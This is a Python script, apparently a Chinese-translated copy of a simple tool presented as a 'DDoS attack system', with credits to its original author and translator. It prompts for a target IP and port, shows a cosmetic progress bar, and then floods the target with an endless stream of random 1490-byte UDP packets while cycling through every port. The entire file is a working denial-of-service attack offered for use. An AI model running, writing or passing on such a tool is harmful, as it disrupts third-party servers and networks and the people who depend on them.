import sys
import os
import time
import socket
import random
from datetime import datetime

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("cls")
print(r""" ____  ____            _        _ _ _             _
|  _ \|  _ \  ___  ___| |_ __ _| | | |_ __ _  ___| | __
| | | | | | |/ _ \/ __| __/ _` | | | | '__| |/ __| |/ /
| |_| | |_| |  __/\__ \ || (_| | | | | |  | | (__|   <
|____/|____/ \___||___/\__\__,_|_|_|_|_|  |_|\___|_|\_\               DDos攻击系统
""")
print("原作者    : HA-MRX")
print("github    : https://github.com/Ha3MrX")
print()
print("汉化      : jggXa")
print("github    : https://github.com/jggXa")
print("===========================================")

ip = input("目标IP    : ")
port = int(input("目标端口  : "))

os.system("cls")
print(r""" ____  ____            _        _ _ _             _
|  _ \|  _ \  ___  ___| |_ __ _| | | |_ __ _  ___| | __
| | | | | | |/ _ \/ __| __/ _` | | | | '__| |/ __| |/ /
| |_| | |_| |  __/\__ \ || (_| | | | | |  | | (__|   <
|____/|____/ \___||___/\__\__,_|_|_|_|_|  |_|\___|_|\_\               DDos攻击系统
""")
print("[                    ] 0% ")
time.sleep(1)
os.system("cls")
print(r""" ____  ____            _        _ _ _             _
|  _ \|  _ \  ___  ___| |_ __ _| | | |_ __ _  ___| | __
| | | | | | |/ _ \/ __| __/ _` | | | | '__| |/ __| |/ /
| |_| | |_| |  __/\__ \ || (_| | | | | |  | | (__|   <
|____/|____/ \___||___/\__\__,_|_|_|_|_|  |_|\___|_|\_\               DDos攻击系统
""")
print("[===============     ] 75%")
time.sleep(2)
os.system("cls")
print(r""" ____  ____            _        _ _ _             _
|  _ \|  _ \  ___  ___| |_ __ _| | | |_ __ _  ___| | __
| | | | | | |/ _ \/ __| __/ _` | | | | '__| |/ __| |/ /
| |_| | |_| |  __/\__ \ || (_| | | | | |  | | (__|   <
|____/|____/ \___||___/\__\__,_|_|_|_|_|  |_|\___|_|\_\               DDos攻击系统
""")
print("[====================] 100%")
time.sleep(1)

sent = 0
while True:
    try:
        sock.sendto(bytes, (ip, port))
        sent = sent + 1
        port = port + 1
        print(f"发送 {sent} 个数据包至{ip}通过本机{port}端口")
        if port == 65534:
            port = 1
    except KeyboardInterrupt:
        print("\n[!] Stopped by user")
        sys.exit()
    except Exception as e:
        print(f"\n[!] Error: {e}")
        sys.exit()
